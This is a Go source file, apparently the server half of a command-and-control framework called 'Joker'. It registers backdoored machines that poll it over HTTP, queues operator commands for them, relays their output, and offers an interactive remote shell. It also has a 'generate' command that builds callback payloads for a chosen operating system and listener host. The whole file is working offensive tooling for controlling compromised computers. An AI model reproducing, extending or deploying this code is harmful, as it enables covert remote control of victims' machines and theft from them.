package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"
)

var continue_use bool = false
var sessions []joker_config = []joker_config{}
var _joker joker = joker{_connected: "None"}

func main() {
	rand.Seed(time.Now().UnixNano())

	fmt.Printf("%s", init_logo)

	http.HandleFunc("/", Handle)
	
	go func() {
		if err := http.ListenAndServe(":8080", nil); err != nil {
			log.Fatalf("ListenAndServe: %v", err)
		}
	}()


	fmt.Println(Fore["GREEN"]+"[Info]"+Fore["RESET"],"Joker engine listening on",Fore["YELLOW"]+"0.0.0.0:8080"+Fore["RESET"])


	for {
		fmt.Printf("\nJoker > ")

		var user_input string = input()
		var parsed_user_input []string

		if len(user_input) > 0 {
			parsed_user_input = CommandLineParser(user_input)
		} else {
			continue
		}

		switch parsed_user_input[0] {
			case("sessions"):
				display_sessions()
			case("use"):
				if len(parsed_user_input) != 3 {
					fmt.Printf("Usage: use <session> <command>")
					continue
				}

				var session_found bool
				var selected_session string = parsed_user_input[1]
				var command_for_sess string = parsed_user_input[2]

				
				for i:=0;i<len(sessions);i++ {
					if sessions[i]._Auth == selected_session {
						session_found = true
						sessions[i]._command=command_for_sess
					}
				}

				if !session_found {
					fmt.Println("Session was not found.")
					break
				}

				_joker._connected = selected_session

				for !continue_use {
					time.Sleep(350*time.Millisecond)
				}

				continue_use = false
			case("shell"):
				if len(parsed_user_input) != 2 {
					fmt.Printf("Usage: shell <session>")
					continue
				}

				var selected_session string = parsed_user_input[1]
				var session_found bool

				for i:=0;i<len(sessions);i++ {
					if sessions[i]._Auth == selected_session {
						session_found = true
					}
				}

				if session_found {
					for {
						var shell_user_input string

						for len(shell_user_input) <= 0 {
							fmt.Printf("%s", "$ ")
							shell_user_input = input()
						}

						if shell_user_input == "exit" {
							break
						}

						_joker._connected = selected_session
						for i:=0;i<len(sessions);i++ {
							if sessions[i]._Auth == selected_session {
								sessions[i]._command=shell_user_input
							}
						}

						for !continue_use {
							time.Sleep(350*time.Millisecond)
						}

						continue_use = false
					}
				} else {
					fmt.Printf("Session was not found.")
				}
			case("generate"):

				var os string
				var lhost string
				for i:=0;i<len(parsed_user_input);i++ {
					var arg string = parsed_user_input[i]
					if strings.Contains(arg, "=") {
						var split []string = strings.Split(arg, "=")

						switch split[0] {
							case("os"):
								os = split[1]
							case("lhost"):
								lhost = split[1]
						}
					}
				}

				if len(os) < 1 || len(lhost) < 1 {
					fmt.Printf("%s", "Usage: generate os=<os> lhost=<lhost>")
					break
				}

				fmt.Printf(generate(os, lhost, "8080"))
			case("exit"):
				os.Exit(0)
			case("help"):
				fmt.Printf("%s", help_text)
			default:
				fmt.Printf("%s", "Command not found.")
		}
	}
}

func Handle(w http.ResponseWriter, r *http.Request) {
	// fmt.Printf("[DEBUG] got / request\n")

	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return
	}
	defer r.Body.Close()

	var JOKER string = r.Header.Get("Joker")

	var SessionID string = r.Header.Get("Auth")
	var Address string = strings.Split(r.RemoteAddr, ":")[0]

	if SessionID == "None" {
		return
	}

	if JOKER == "*" {
		var Self string = r.Header.Get("Self")
		var Os string = r.Header.Get("Os")

		for i:=0;i<len(sessions);i++ {
			if sessions[i]._Auth==SessionID {
				return
			}
		}

		sessions = append(sessions, joker_config{_Auth: SessionID,_Self: Self,_Os: Os,_command: "None",_Addr: Address,_Active:time.Now().UTC().Unix()})
		// fmt.Println("[127.0.0.1] New Backdoor established", SessionID,Self,Os)
	} else if JOKER == "?" {
		for i:=0;i<len(sessions);i++ {
			if sessions[i]._Auth == SessionID {
				sessions[i]._Active = time.Now().UTC().Unix()
				if _joker._connected == SessionID {
					fmt.Fprintf(w, sessions[i]._command)
				} else {
					fmt.Fprintf(w, "None")
				}
				sessions[i]._command="None"
			}
		}
	} else if JOKER == "+" {
		for i:=0;i<len(sessions);i++ {
			if sessions[i]._Auth == SessionID {
				sessions[i]._Active = time.Now().UTC().Unix()
				sessions[i]._history = append(sessions[i]._history, string(body))

				if _joker._connected == SessionID {
					fmt.Printf(Fore["GREEN"]+sessions[i]._history[len(sessions[i]._history) - 1]+Fore["RESET"])
					continue_use = true
				}
			}
		}
	}
}